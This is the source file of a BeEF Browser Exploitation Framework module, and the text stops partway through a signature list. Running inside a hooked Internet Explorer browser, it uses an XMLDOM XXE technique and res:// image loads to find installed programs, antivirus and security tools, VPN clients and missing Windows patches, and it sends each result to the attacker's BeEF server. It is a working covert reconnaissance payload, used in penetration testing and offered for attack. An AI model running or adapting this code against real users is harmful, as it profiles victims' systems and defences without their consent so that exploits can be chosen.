//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  if (!("ActiveXObject" in window)) {
    beef.debug('[Detect Software] Unspported browser');
    beef.net.send('<%= @command_url %>', <%= @command_id %>,'fail=unsupported browser', beef.are.status_error());
    return false;
  }

  var drive = 'C';
  var win_dir = 'WINDOWS';
  var program_dirs = ['Program Files', 'Program Files (x86)'];
  var xmldom_supported = false;

  function detect_folder(path) {
    var dtd = 'res://' + path;
    var xml = '<?xml version="1.0" ?><!DOCTYPE anything SYSTEM "' + dtd + '">';
    var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
    xmlDoc.async = true;
    try {
      xmlDoc.loadXML(xml);
      return false;
    } catch (e) {
      return true;
    }
  }

  // Test XMLDOM XXE technique
  for (var i = 0; i < program_dirs.length; i++) {
    var path = drive + ":\\" + program_dirs[i];
    var result = detect_folder(path);
    if (result) {
      xmldom_supported = true;
      break;
    }
  }

  // Detect software using XMLDOM XXE technique
  var software = [
    ['7zip', '7-Zip'],
    ['Acoustica MP3 Audio Mixer', 'Acoustica MP3 Audio Mixer'],
    ['Autodesk AutoCAD 2015', 'Autodesk\\AutoCAD 2015'],
    ['Autodesk AutoCAD 2016', 'Autodesk\\AutoCAD 2016'],
    ['Adobe Help', 'Adobe\\Adobe Help Viewer'],
    ['Adobe Professional 7', 'Adobe\\Acrobat 7.0'],
    ['Adobe Reader 7', 'Adobe\\Reader 7.0\\Reader'],
    ['Adobe Reader 8', 'Adobe\\Reader 8.0\\Reader'],
    ['Adobe Reader 9', 'Adobe\\Reader 9.0\\Reader'],
    ['Adobe Reader 10', 'Adobe\\Reader 10.0\\Reader'],
    ['Adobe Reader 11', 'Adobe\\Reader 11.0\\Reader'],
    ['Ahead Nero', 'ahead'],
    ['AirPcap', 'Riverbed\\AirPcap'],
    ['Apple Software Update', 'Apple Software Update'],
    ['Azureus', 'azureus'],
    ['Baidu', 'baidu'],
    ['BitComet', 'BitComet'],
    ['BitSpirit', 'BitSpirit'],
    ['BioExplorer', 'BioExplorer'],
    ['Cisco Prime Data Center Network Manager', 'Cisco Systems\\dcm'],
    ['Citrix', 'Citrix'],
    ['DbVisualizer', 'DbVisualizer'],
    ['eMule', 'eMule'],
    ['eMule', 'easyMule2'],
    ['Flash MX 2004', 'Macromedia\\Flash MX 2004'],
    ['Flashget', 'FlashGet'],
    ['Flashget 3', 'FlashGet Network\\FlashGet 3'],
    ['FoxIt Reader', 'Foxit Software'],
    ['FoxIt Reader', 'Foxit Reader'],
    ['Free Nokia Ringtone Converter', 'Free Nokia Ringtone Converter'],
    ['Git', 'Git'],
    ['Gnome Music Player Client', 'Gnome Music Player Client'],
    ['GnuPG', 'GNU\\GnuPG'],
    ['Heroku', 'Heroku'],
    ['HP AutoPass License Server', 'HP\\HP AutoPass License Server'],
    ['HP TRIM', 'Hewlett-Packard\\HP TRIM'],
    ['IceWeasel', 'IceWeasel'],
    ['IncredibleCharts', 'IncredibleCharts'],
    ['Internet Explorer', 'Internet Explorer'],
    ['iTunes', 'iTunes'],
    ['Java JRE 6', 'Java\\jre6'],
    ['Java JRE 7', 'Java\\jre7'],
    ['Java JRE 8', 'Java\\jre8'],
    ['JetBrains dotPeek', 'JetBrains\\dotPeek'],
    ['Juniper Network Connect 8.1', 'Juniper Networks\\Network Connect 8.1'],
    ['JXplorer', 'jxplorer'],
    ['Lexmark Markvision Enterprise', 'Lexmark\\Markvision Enterprise'],
    ['Magellan MapSend Lite', 'Magellan\MapSend Lite'],
    ['Microsoft Baseline Security Analyzer 2', 'Microsoft Baseline Security Analyzer 2'],
    ['Microsoft Live Meeting 7', 'Microsoft Office\\live meeting 7'],
    ['Microsoft SQL Server', 'Microsoft SQL Server'],
    ['Microsoft SQL Server Compact Edition', 'Microsoft SQL Server Compact Edition'],
    ['Microsoft Virtual PC', 'Microsoft Virtual PC'],
    ['Microsoft Visual Studio 8', 'Microsoft Visual Studio 8'],
    ['Microsoft Visual Studio 9', 'Microsoft Visual Studio 9'],
    ['Microsoft Visual Studio 10', 'Microsoft Visual Studio 10'],
    ['Microsoft Visual Studio 11', 'Microsoft Visual Studio 11'],
    ['Microsoft Visual Studio 12', 'Microsoft Visual Studio 12'],
    ['mIRC', 'mIRC'],
    ['Mozilla Firefox', 'Mozilla Firefox'],
    ['MSN Messenger', 'Messenger'],
    ['NipperStudio', 'NipperStudio'],
    ['KeePass Password Safe 2', 'KeePass Password Safe 2'],
    ['NetBeans 8.1', 'NetBeans 8.1'],
    ['NeuroServer', 'NeuroServer'],
    ['Nokia PC Suite', 'Nokia\\Connectivity Cable Driver'],
    ['Notepad Plus Plus', 'Notepad++'],
    ['Opera', 'Opera'],
    ['Oracle JavaFX 2.0 Runtime', 'Oracle\\JavaFX 2.0 Runtime'],
    ['Outlook Express', 'Outlook Express'],
    ['Paritech Pulse', 'Paritech\\Pulse'],
    ['PGP Desktop', 'PGP Corporation\\PGP Desktop'],
    ['Picasa2', 'picasa2'],
    ['Proxifier', 'Proxifier'],
    ['QuickTime', 'QuickTime'],
    ['QLogic SANsurfer', 'QLogic Corporation\SANsurfer'],
    ['radmin', 'Radmin'],
    ['Real VNC4', 'RealVNC\\VNC4'],
    ['RedGate .NET Reflector', 'Red Gate\\.NET Reflector'],
    ['Resource Hacker', 'Resource Hacker'],
    ['Safari', 'Safari'],
    ['SeaMonkey', 'SeaMonkey'],
    ['SiteKiosk', 'SiteKiosk'],
    ['Spark', 'Spark'],
    ['TeamSpeak 3 Client', 'TeamSpeak 3 Client'],
    ['TinaSoft Easy Cafe Server', 'TinaSoft\\Easy Cafe Server'],
    ['Trend Micro Deep Security Manager', 'Trend Micro\\Deep Security Manager'],
    ['TrueCrypt', 'TrueCrypt'],
    ['TopShare Portfolio Manager v2', 'TopShare Portfolio Manager V2'],
    ['Samsung USB Drivers for Mobile Phones', 'SAMSUNG\\USB Drivers'],
    ['Secure CRT', 'SecureCRT'],
    ['Serv—U', 'RhinoSoft.com\\Serv—U'],
    ['Skype', 'Skype\\Phone'],
    ['SoapUI 5.0.0', 'SmartBear\\SoapUI-5.0.0'],
    ['Thunder', 'Thunder Network\\Thunder'],
    ['Thunder', 'Thunder Network\\Thunder6'],
    ['Tencent QQDownload', 'Tencent\\QQDownload'],
    ['VLC', 'VideoLAN\\VLC'],
    ['Ultramon', 'ultramon\\ultramondesktop.exe'],
    ['Unreal Media Server', 'UnrealStreaming\\UMediaServer'],
    ['uTorrent', 'uTorrent'],
    ['VMware Workstation', 'vmware\\vmware workstation'],
    ['VMware Tools', 'VMware\\VMware Tools'],
    ['VMware Workstation', 'VMware\\VMware Workstation'],
    ['VirtualBox Guest Additions', 'Oracle\\VirtualBox Guest Additions'],
    ['Winamp', 'winamp'],
    ['Windows DVD Maker', 'DVD Maker'],
    ['Windows Journal', 'Windows Journal'],
    ['Windows Media Player', 'Windows Media Player'],
    ['Windows Mail', 'Windows Mail'],
    ['Windows Movie Maker', 'Movie Maker'],
    ['Windows NetMeeting', 'NetMeeting'],
    ['Windows Photo Viewer', 'Windows Photo Viewer'],
    ['WinHex', 'WinHex'],
    ['WinRAR', 'WinRAR'],
    ['WinZip', 'WinZip'],
    ['Wireshark', 'Wireshark'],
    ['WinPcap', 'WinPcap'],
    ['WinSCP', 'WinSCP'],
    ['XFire', 'xfire'],
    ['Xming', 'Xming X Server'],
    ['Yahoo Messenger', 'Yahoo!\\Messenger'],

    // AntiVirus
    ['360Safe', '360\\360Safe'],
    ['360Safe', '360Safe'],
    ['A-Squared Anti-Malware', 'A-Squared Anti-Malware'],
    ['Agnitum Outpost Security Suite Pro', 'Agnitum\\Outpost Security Suite Pro'],
    ['AhnLab', 'AhnLab'],
    ['ESET Smart Security', 'ESET\\ESET Smart Security'],
    ['ESTsoft ALYac Internet Security', 'ESTsoft\\ALYac'],
    ['AhnLab', 'AhnLab\\Smart Update Utility'],
    ['AhnLab V3 Internet Security Lite', 'AhnLab\\V3Lite'],
    ['Avast AntiVirus 4', 'Alwil Software\\Avast4'],
    ['Avast AntiVirus', 'AVAST Software\\Avast'],
    ['AVG 2012', 'AVG\\AVG2012'],
    ['AVG', 'AVG Secure Search'],
    ['Avira AntiVir Desktop', 'Avira\\AntiVir Desktop'],
    ['Avira AntiVir Personal Edition', 'Avira\\AntiVir PersonalEdition Classic'],
    ['BitDefender', 'BitDefender'],
    ['DrWeb AntiVirus', 'DrWeb'],
    ['eScan AntiVirus', 'eScan'],
    ['F-Secure ExploitShield', 'F-Secure\\ExploitShield'],
    ['F-Secure Internet Security', 'F-Secure Internet Security\\FSPS'],
    ['F-PROT Antivirus', 'FRISK Software\\F-PROT Antivirus for Windows'],
    ['Kaspersky Internet Security 2012', 'Kaspersky Lab\\Kaspersky Internet Security 2012'],
    ['Kaspersky Anti-Virus 2009', 'Kaspersky Lab\\Kaspersky Anti-Virus 2009'],
    ['Kaspersky Anti-Virus 2010', 'Kaspersky Lab\\Kaspersky Anti-Virus 2010'],
    ['Kaspersky Anti-Virus 2011', 'Kaspersky Lab\\Kaspersky Anti-Virus 2011'],
    ['Kaspersky Anti-Virus 2012', 'Kaspersky Lab\\Kaspersky Anti-Virus 2012'],
    ['Kaspersky Anti-Virus 2013', 'Kaspersky Lab\\Kaspersky Anti-Virus 2013'],
    ['Kaspersky Anti-Virus 2014', 'Kaspersky Lab\\Kaspersky Anti-Virus 2014'],
    ['Kaspersky Endpoint Security 8', 'Kaspersky Lab\\Kaspersky Endpoint Security 8 for Windows'],
    ['Kaspersky Internet Security 2010', 'Kaspersky Lab\\Kaspersky Internet Security 2010'],
    ['Kaspersky Internet Security 2009', 'Kaspersky Lab\\Kaspersky Internet Security 2009'],
    ['Kingsoft AntiVirus', 'KingSoft\\kingsoft antivirus'],
    ['IKARUS anti.virus', 'IKARUS\\anti.virus'],
    ['Immunet AntiVirus', 'Immunet'],
    ['JiangMin AntiVirus', 'JiangMin\\AntiVirus'],
    ['Micropoint AntiVirus', 'Micropoint'],
    ['Microsoft EMET 4.1', 'EMET 4.1'],
    ['Microsoft EMET 5.0', 'EMET 5.0'],
    ['McAfee Total Protection 2011', 'McAfeeMOBK'],
    ['McAfee Enterprise', 'McAfee\\VirusScan Enterprise'],
    ['McAfee Security Center', 'McAfee\\MSC'],
    ['Norman Scan Engine', 'Norman\\Nse'],
    ['Norton Internet Security', 'Norton Internet Security'],
    ['Norton AntiVirus', 'Norton AntiVirus'],
    ['nProtect Anti-Virus Spyware 3.0', 'INCAInternet\\nProtect Anti-Virus Spyware 3.0'],
    ['PC Tools Antivirus Software', 'PC Tools Antivirus Software'],
    ['Quick Heal Total Security', 'Quick Heal\\Quick Heal Total Security'],
    ['Sucop Antivirus', 'Sucop\\SecPlugin'],
    ['Rising AntiVirus', 'Rising\\RAV'],
    ['Rising AntiVirus', 'Rising\\RIS'],
    ['Rising Firewall', 'Rising\\RFW'],
    ['Sunbelt Software Personal Firewall', 'Sunbelt Software\\Personal Firewall'],
    ['Sophos Sophos Anti-Virus', 'Sophos\\Sophos Anti-Virus'],
    ['Sophos Client Firewall', 'Sophos\\Sophos Client Firewall'],
    ['SUPERAntiSpyware', 'SUPERAntiSpyware'],
    ['Symantec Endpoint Protection', 'Symantec\\Symantec Endpoint Protection'],
    ['Symantec Antivirus', 'symantec_client_security\\symantec antivirus'],
    ['Trend Micro Internet Security', 'Trend Micro\\Internet Security'],
    ['Trend Micro OfficeScan Client', 'Trend Micro\\OfficeScan Client'],
    ['VirusBuster', 'VirusBuster'],
    ['Windows Defender', 'Windows Defender'],
    ['ZoneAlarm', 'Zone Labs\\ZoneAlarm'],

    // Office
    ['Microsoft Office', 'Microsoft Office\\OFFICE'],
    ['Microsoft Office 10', 'Microsoft Office\\OFFICE10'],
    ['Microsoft Office 11', 'Microsoft Office\\OFFICE11'],
    ['Microsoft Office 12', 'Microsoft Office\\OFFICE12'],
    ['Microsoft Office 13', 'Microsoft Office\\OFFICE13'],
    ['Microsoft Office 14', 'Microsoft Office\\OFFICE14'],
    ['WPS Office', 'Kingsoft\\Kingsoft Office'],
    ['WPS Office Personal', 'Kingsoft\\WPS Office Personal'],
    ['WPS Office 2008', 'Kingsoft\\WPS Office 2008'],
    ['WPS Office 2009', 'Kingsoft\\WPS Office 2009'],
    ['WPS Office 2010', 'Kingsoft\\WPS Office 2010'],

    // Security
    ['Cain', 'Cain'],
    ['Echo Mirage', 'Echo Mirage'],
    ['Fiddler2', 'Fiddler2'],
    ['L0pht Crack 5', '@stake\\LC5'],
    ['Immunity Debugger', 'Immunity Inc\\Immunity Debugger'],
    ['Network Miner v2.1', 'NetworkMiner_2-1'],
    ['Nmap', 'nmap'],

    // VPN
    ['Checkpoint Endpoint Connect', 'Checkpoint\\Endpoint Connect'],
    ['Cisco AnyConnect Secure Mobility Client', 'Cisco AnyConnect Secure Mobility Client'],
    ['Cisco AnyConnect VPN Client', 'Cisco AnyConnect VPN Client'],
    ['Fortinet FortiClient', 'Fortinet\\FortiClient'],
    ['OpenVPN', 'OpenVPN']
  ];

  if (xmldom_supported) {
    beef.debug('[Detect Software] Enumerating software...');
    for (var i = 0; i < program_dirs.length; i++) {
      for (var j = 0; j < software.length; j++) {
        var path = drive + ":\\" + program_dirs[i] + "\\" + software[j][1];
        var result = detect_folder(path);
        if (result) {
          beef.debug('[Detect Software] Found software: ' + path);
          beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_software=" + software[j][0]);
        }
      }
    }
  }

  // Enumerate patches (Win XP only)
  var patches = [
    'KB2570947',
    'KB2584146',
    'KB2585542',
    'KB2592799',
    'KB2598479',
    'KB2603381',
    'KB2619339',
    'KB2620712',
    'KB2631813',
    'KB2653956',
    'KB2655992',
    'KB2659262',
    'KB2661637',
    'KB2676562',
    'KB2686509',
    'KB2691442',
    'KB2698365',
    'KB2705219-v2',
    'KB2712808',
    'KB2719985',
    'KB2723135-v2',
    'KB2727528',
    'KB2749655',
    'KB2757638',
    'KB2770660',
    'KB2780091',
    'KB2802968',
    'KB2803821-v2_WM9',
    'KB2807986',
    'KB2813345',
    'KB2820917',
    'KB2834886',
    'KB2847311',
    'KB2850869',
    'KB2859537',
    'KB2862152',
    'KB2862330',
    'KB2862335',
    'KB2864063',
    'KB2868038',
    'KB2868626',
    'KB2876217',
    'KB2876331',
    'KB2892075',
    'KB2893294',
    'KB2898715',
    'KB2900986',
    'KB2904266',
    'KB2909212',
    'KB2914368',
    'KB2916036',
    'KB2922229',
    'KB2929961',
    'KB2930275',
    'KB2934207',
    'KB2936068',
    'KB2964358',
    'KB898461',
    'KB923561',
    'KB946648',
    'KB950762',
    'KB950974',
    'KB951376-v2',
    'KB951978',
    'KB952004',
    'KB952069_WM9',
    'KB952287',
    'KB952954',
    'KB953155',
    'KB954155_WM9',
    'KB955759',
    'KB956572',
    'KB956844',
    'KB959426',
    'KB960803',
    'KB960859',
    'KB961118',
    'KB968389',
    'KB969059',
    'KB970430',
    'KB970483',
    'KB971029',
    'KB971657',
    'KB972270',
    'KB973507',
    'KB973540_WM9',
    'KB973815',
    'KB973869',
    'KB973904',
    'KB974112',
    'KB974318',
    'KB974392',
    'KB974571',
    'KB975025',
    'KB975467',
    'KB975558_WM8',
    'KB975560',
    'KB975713',
    'KB976323',
    'KB977816',
    'KB977914',
    'KB978338',
    'KB978542',
    'KB978695_WM9',
    'KB978706',
    'KB979309',
    'KB979482',
    'KB979687',
    'KB981997',
    'KB982132',
    'KB982665'
  ];

  if (xmldom_supported) {
    beef.debug("[Detect Software] Enumerating installed patches...");
    for (var i = 0; i < patches.length; i++) {
      var path = drive + ":\\" + win_dir + "\\$NtUninstall" + patches[i] + "$";
      var result = detect_folder(path);
      if (result) {
        beef.debug('[Detect Software] Found patch: ' + path);
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_patches=" + patches[i]);
      }
    }
  }

  // Skip software detection using 'res' scheme and EXE/DLL resource images
  // if XMLDOM XXE technique worked
  if (xmldom_supported) return;



  // Detect software using 'res' scheme and EXE/DLL resource images
  var dom = beef.dom.createInvisibleIframe();

  // Enumerate patches (Win XP only)
  var patches = [
    ["KB2964358", "mshtml.dll/2/2030"],      // MS14-021
    ["KB2936068", "mshtmled.dll/2/2503"],    // MS14-018
    ["KB2864063", "themeui.dll/2/120"],      // MS13-071
    ["KB2859537", "ntkrpamp.exe/2/1"],       // MS13-063
    ["KB2813345", "mstscax.dll/2/101"],      // MS13-029
    ["KB2820917", "winsrv.dll/#2/#512"],     // MS13-033
    ["KB2691442", "shell32.dll/2/130"],      // MS12-048
    ["KB2676562", "ntkrpamp.exe/2/1"],       // MS12-034
    ["KB2506212", "mfc42.dll/#2/#26567"],    // MS11-024
    ["KB2483185", "shell32.dll/2/130"],      // MS11-006
    ["KB2481109", "mstsc.exe/#2/#620"],      // MS11-017
    ["KB2443105", "isign32.dll/2/#101"],     // MS10-097
    ["KB2393802", "ntkrnlpa.exe/2/#1"],      // MS11-011
    ["KB2387149", "mfc40.dll/#2/#26567"],    // MS10-074
    ["KB2296011", "comctl32.dll/#2/#120"],   // MS10-081
    ["KB979687", "wordpad.exe/#2/#131"],     // MS10-083
    ["KB978706", "mspaint.exe/#2/#102"],     // MS10-005
    ["KB977914", "iyuv_32.dll/2/INDEOLOGO"], // MS10-013
    ["KB973869", "dhtmled.ocx/#2/#1"]        // MS09-037
  ];

  beef.debug("[Detect Software] Enumerating installed patches...");
  for (var i=0; i<patches.length; i++) {
    var img    = new Image;
    img.title  = patches[i][0];
    img.src    = "res://" + drive + ":\\" + win_dir + "\\$NtUninstall" + patches[i][0] + "$\\" + patches[i][1];
    img.onload = function() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_patches=" + this.title); dom.removeChild(this); }
    img.onerror= function() { dom.removeChild(this); }
    dom.appendChild(img);
  }

  // Enumerate software
  var software = [
    ["7zip", "7-Zip\\7zFM.exe/2/2002"],
    ["Adobe Help", "Adobe\\Adobe Help Viewer\\1.0\\ahv.exe/#2/#132"],
    ["Baidu", "baidu\\Baidu Hi\\BaiduHi.exe/#2/#152"],
    ["Cain", "Cain\\UNWISE.EXE/2/106"],
    ["Echo Mirage", "Echo Mirage\\unins000.exe/2/DISKIMAGE"],
    ["FoxIt Reader", "Foxit Software\\Foxit Reader\\Foxit Reader.exe/2/257"],
    ["FoxIt Reader", "Foxit Reader\\Foxit Reader.exe/#2/#484"],
    ["Internet Explorer", "Internet Explorer\\iedvtool.dll/2/4000"],
    ["Outlook Express", "Outlook Express\\msoeres.dll/2/1"],
    ["KeePass Password Safe 2", "KeePass Password Safe 2\\unins000.exe/2/DISKIMAGE"],
    ["Nokia PC Suite", "Nokia\\Connectivity Cable Driver\\nmwcdcocls.dll/2/131"],
    ["Notepad Plus Plus", "Notepad++\\uninstall.exe/2/110"],
    ["OpenVPN", "OpenVPN\\Uninstall.exe/2/110"],
    ["Oracle JavaFX 2.0 Runtime", "Oracle\\JavaFX 2.0 Runtime\\bin\\eula.dll/2/204"],
    ["Resource Hacker", "Resource Hacker\\ResHacker.exe/2/128"],
    ["Samsung USB Drivers for Mobile Phones", "SAMSUNG\\USB Drivers\\Uninstall.exe/2/132"],
    ["Tencent QQDownload", "Tencent\\QQDownload\\QQDownload.exe/2/132"],
    ["QuickTime", "QuickTime\\QTinfo.exe/2/101"],
    ["QuickTime", "QuickTime\\quicktimeplayer.exe/#2/#403"],
    ["VLC", "VideoLAN\\VLC\\npvlc.dll/2/3"],
    ["Immunity Debugger", "Immunity Inc\\Immunity Debugger\\ImmunityDebugger.exe/2/GOTO"],
    ["Java JRE 6", "Java\\jre6\\bin\\awt.dll/2/CHECK_BITMAP"],
    ["Java JRE 7", "Java\\jre7\\bin\\awt.dll/2/CHECK_BITMAP"],
    ["Java JRE 8", "Java\\jre8\\bin\\awt.dll/2/CHECK_BITMAP"],
    ["VMware Tools", "VMware\\VMware Tools\\TPVCGatewaydeu.dll/2/30994"],
    ["VMware Tools", "VMware\\VMware Tools\\TPAutoConnSvc.exe/#2/30995"],
    ["VMware Workstation", "VMware\\VMware Workstation\\vmplayer.exe/#2/5"],
    ["VMware Workstation", "VMware\\VMware Workstation\\vmware.exe/#2/#508"],
    ["VirtualBox Guest Additions", "Oracle\\VirtualBox Guest Additions\\uninst.exe/#2/110"],
    ["Windows DVD Maker", "DVD Maker\\DVDMaker.exe/2/438"],
    ["Windows Journal", "Windows Journal\\Journal.exe/2/112"],
    ["Windows Mail", "Windows Mail\\msoeres.dll/2/1"],
    ["Windows Movie Maker", "Movie Maker\\wmm2res.dll/2/201"],
    ["Windows NetMeeting", "NetMeeting\\nmchat.dll/2/207"],
    ["Windows Photo Viewer", "Windows Photo Viewer\\PhotoViewer.dll/2/#51209"],
    ["WinRAR", "WinRAR\\WinRAR.exe/#2/#150"],
    ["Microsoft Virtual PC", "Microsoft Virtual PC\\Virtual PC.exe/#2/150"],
    ["Wireshark", "Wireshark\\uninstall.exe/2/110"],

    // AntiVirus software
    ["360Safe", '360\\360Safe\\360leakfixer.exe/#2/110'],
    ["360Safe", '360\\360Safe\\repairleakdll.dll/GIF/154'],
    ["360Safe", '360Safe\\live.dll/#2/#203'],
    ["360Safe", '360\\360safe\\360Safe.exe/2/131'],
    ["ESTsoft ALYac Internet Security", 'ESTsoft\\ALYac\\AYUpdate.aye/2/30994'],
    ["AhnLab", 'AhnLab\\Smart Update Utility\\SUpdate.exe/2/153'],
    ["AhnLab V3 Internet Security Lite", 'AhnLab\\V3Lite\\V3LTray.exe/2/132'],
    ["Avast AntiVirus 4", 'Alwil Software\\Avast4\\ashAvast.exe/2/267'],
    ["Avast AntiVirus", 'AVAST Software\\Avast\\aswAra.dll/#2/101'],
    ["AVG 2012", 'AVG\\AVG2012\\avguires.dll/#2/111'],
    ["Avira AntiVir Desktop", 'Avira\\AntiVir Desktop\\ccquarc.dll/#2/101'],
    ["Avira AntiVir Desktop", 'Avira\\AntiVir Desktop\\setup.dll/#2/132'],
    ["Avira AntiVir Personal Edition", 'Avira\\AntiVir PersonalEdition Classic\\setup.dll/#2/#132'],
    ["DrWeb AntiVirus", 'DrWeb\\spideragent.exe/#2/133'],
    ["Kaspersky Internet Security 2012", 'Kaspersky Lab\\Kaspersky Internet Security 2012\\basegui.ppl/#2'],
    ["Kaspersky Anti-Virus 2009", 'Kaspersky Lab\\Kaspersky Anti-Virus 2009\\oeas.dll/2/206'],
    ["Kaspersky Anti-Virus 2010", 'Kaspersky Lab\\Kaspersky Anti-Virus 2010\\shellex.dll/2/103'],
    ["Kaspersky Internet Security 2010", 'Kaspersky Lab\\Kaspersky Internet Security 2010\\shellex.dll/2/103'],
    ["Kaspersky Internet Security 2009", 'Kaspersky Lab\\Kaspersky Internet Security 2009\\oeas.dll/2/206'],
    ["Kingsoft AntiVirus", 'KingSoft\\kingsoft antivirus\\kislive.exe/#2/102'],
    ["Rising AntiVirus", 'Rising\\RAV\\RavUsb.exe/#2/112'],
    ["Rising AntiVirus", 'Rising\\Ris\\SetUp.exe/2/147'],
    ["ESET Smart Security", 'ESET\\ESET Smart Security\\eguiEpfw.dll/#2/1070'],
    ["JiangMin AntiVirus", 'JiangMin\\AntiVirus\\VirusBox.exe/#2/128'],
    ["JiangMin AntiVirus", 'JiangMin\\Install\\KVOL.exe/2/202'],
    ["Micropoint AntiVirus", 'Micropoint\\mfc90.dll/#2/30994'],
    ["McAfee Total Protection 2011", 'McAfeeMOBK\\BootStrap.exe/#2/30994'],
    ["McAfee Enterprise", 'McAfee\\VirusScan Enterprise\\graphics.dll/2/202'],
    ["McAfee Security Center", 'McAfee\\MSC\\mclgview.exe/2/129'],
    ["Norton Internet Security 16.0.0.125", 'Norton Internet Security\\Engine\\16.0.0.125\\SymSHAx9.dll/2/102'],
    ["Norton Internet Security 16.5.0.135", 'Norton Internet Security\\Engine\\16.5.0.135\\SymSHAx9.dll/2/102'],
    ["Norton AntiVirus 17.5.0.127", 'Norton AntiVirus\\MUI\\17.5.0.127\\images\\cssbase.dll/2/SCANTASKWZ_SCAN_ITEM_LIST.BMP'],
    ["NOD32 Smart Security", 'ESET\\ESET Smart Security\\eguiEpfw.dll/2/1070'],
    ["Trend Micro Internet Security", 'Trend Micro\\Internet Security\\UfSeAgnt.exe/2/30994'],
    ["Trend Micro OfficeScan Client", 'Trend Micro\\OfficeScan Client\\PcNTMon.exe/2/30994'],
    ["Sucop Antivirus", 'Sucop\\SecPlugin\\SecPlugin.dll/#2/211'],
    ["Sophos Client Firewall", 'Sophos\\Sophos Client Firewall\\logo_rc.dll/2/114'],
    ["Symantec Endpoint Protection", 'Symantec\\LiveUpdate\\AUPDATE.exe/2/129'],
    ["ZoneAlarm", 'Zone Labs\\ZoneAlarm\\alert.zap/2/176'],

    // The following signatures were taken from:
    // https://www.alienvault.com/blogs/labs-research/attackers-abusing-internet-explorer-to-enumerate-software-and-detect-securi
    ["Microsoft Office 97", "Microsoft Office\\OFFICE\\BINDER.EXE/16/1"],
    ["Microsoft Office 2000", "Microsoft Office\\OFFICE\\WINWORD.EXE/16/1"],
    ["Microsoft Office XP", "Microsoft Office\\OFFICE10\\WINWORD.EXE/16/1"],
    ["Microsoft Office 2003", "Microsoft Office\\OFFICE11\\WINWORD.EXE/16/1"],
    ["Microsoft Office 2007", "Microsoft Office\\OFFICE12\\WINWORD.EXE/16/1"],
    ["Microsoft Office 2010", "Microsoft Office\\OFFICE14\\WINWORD.EXE/16/1"],
    ["WPS Office Personal", "Kingsoft\\WPS Office Personal\\utility\\repairinst.exe/16/1"],
    ["WPS Office 2008", "Kingsoft\\WPS Office 2008\\utility\\repairinst.exe/16/1"],
    ["WPS Office 2009", "Kingsoft\\WPS Office 2009\\utility\\repairinst.exe/16/1"],
    ["WPS Office 2010", "Kingsoft\\WPS Office 2010\\utility\\repairinst.exe/16/1"],
    ["WinRar 3.5", "WinRAR\\WinRar.exe/6/90"],
    ["WinRar 3.6", "WinRAR\\WinRar.exe/6/91"],
    ["WinRar 3.7", "WinRAR\\WinRar.exe/6/92"],
    ["WinRar 3.8", "WinRAR\\WinRar.exe/6/93"],
    ["WinRar 3.9", "WinRAR\\RarExt.d11/24/2"],
    ["WinZip", "WinZip\\WinZip32.exe/16/1"],
    ["7zip", "7—Zip\\7zFm.exe/16/1"],
    ["Adobe Reader 7", "Adobe\\Reader 7.0\\Reader\\AXEParser.d11/16/1"],
    ["Adobe Professional 7", "Adobe\\Acrobat 7.0\\Acrobat\\Acrobat.dll/16/1"],
    ["Adobe Reader 8", "Adobe\\Reader 8.0\\Reader\\AdobeXMP.d11/16/1"],
    ["Adobe Reader 9", "Adobe\\Reader 9.0\\Reader\\AcroRd32.exe/16/1"],
    ["Adobe Reader 10", "Adobe\\Reader 10.0\\Reader\\AcroRd32.exe/16/1"],
    ["Skype", "Skype\\Phone\\Skype.exe/16/1"],
    ["Skype", "Skype\\Phone\\sktransfer.d11/16/1"],
    ["Microsoft Outlook 6", "Outlook Express\\msimn.exe/16/1"],
    ["Microsoft Outlook 2000", "Microsoft Office\\OFFICE\\OUTLOOK.EXE/16/1"],
    ["Microsoft Outlook XP", "Microsoft Office\\OFFICE10\\OUTLOOK.EXE/16/1"],
    ["Microsoft Outlook 2003", "Microsoft Office\\OFFICE11\\OUTLOOK.EXE/16/1"],
    ["Microsoft Outlook 2007", "Microsoft Office\\OFFICE12\\OUTLOOK.EXE/16/1"],
    ["Microsoft Outlook 2010", "Microsoft Office\\OFFICE14\\OUTLOOK.EXE/16/1"],
    ["Yahoo Messenger", "Yahoo!\\Messenger\\YahooMessenger.exe/16/1"],
    ["Yahoo Messenger 5", "Yahoo!\\Messenger\\YPager.exe/16/1"],
    ["Yahoo Messenger 6", "Yahoo!\\Messenger\\asw.d11/16/1"],
    ["Yahoo Messenger 7", "Yahoo!\\Messenger\\yxtldr.d11/16/1"],
    ["Yahoo Messenger 8", "Yahoo!\\Messenger\\P2PCE.d11/16/1"],
    ["Yahoo Messenger 9", "Yahoo!\\Messenger\\GIPSVoiceEngineDLL_MD.d11/16/1"],
    ["Yahoo Messenger 10", "Yahoo!\\Messenger\\ConnectionWizard.d11/16/1"],
    ["Flashget", "FlashGet\\flashget.exe/16/1"],
    ["Flashget", "FlashGet Network\\FlashGet 3\\Flashget3.exe/16/1"],
    ["Thunder", "Thunder Network\\Thunder\\Thunder.exe/16/1"],
    ["Thunder", "Thunder Network\\Thunder\\Program\\Thunder.exe/16/1"],
    ["Thunder", "Thunder Network\\Thunder6\\Thunder.exe/16/1"],
    ["eMule", "eMule\\emule.exe/16/1"],
    ["eMule", "easyMule2\\easyMule.exe/16/1"],
    ["BT", "BitComet\\BitComet.exe/16/1"],
    ["QDownload", "Tencent\\QQDownload\\QQDownload.exe/16/1"],
    ["BitSpirit", "BitSpirit\\BitSpirit.exe/16/1"],
    ["Serv—U", "RhinoSoft.com\\Serv—U\\Serv—U.exe/16/1"],
    ["radmin", "Radmin\\radmin.exe/16/1"],

    // The following signatures were taken from AttackAPI
    // https://code.google.com/p/attackapi/source/browse/tags/attackapi-2.5.0b/lib/dom/signatures.js
    ['L0pht Crack 5', '@stake\\LC5\\lc5.exe/#2/#102'],
    ['Adobe Acrobat 7', 'adobe\\acrobat 7.0\\acrobat\\acrobat.dll/#2/#210'],
    ['Ahead Nero', 'ahead\\nero\\nero.exe/#2/NEROSESPLASH'],
    ['Azureus', 'azureus\\uninstall.exe/#2/#110'],
    ['Cain', 'cain\\uninstal.exe/#2/#106'],
    ['Citrix', 'Citrix\\icaweb32\\mfc30.dll/#2/#30989'],
